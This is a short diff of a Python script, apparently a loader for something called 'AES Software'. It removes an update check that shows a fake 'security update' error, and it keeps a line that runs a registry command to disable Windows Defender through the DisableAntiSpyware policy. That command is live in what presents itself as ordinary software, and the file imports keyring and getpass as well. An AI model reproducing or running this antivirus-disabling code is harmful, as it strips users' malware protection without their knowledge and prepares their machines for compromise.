@@ -6,15 +6,6 @@ import getpass
 import keyring
 
 import subprocess
-
-try:
-    aesv5_update()
-except:
-    os.system('cls')
-    mylogo()
-    printg("Error, there is a new security update for AES Software.")
-    show_message_box("New security update. Please get the new loader from the dev.", "Error", MB_OK | ICON_ERROR)
-    exit()
 try:
     subprocess.run('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, check=True)
     print("Command executed successfully.")
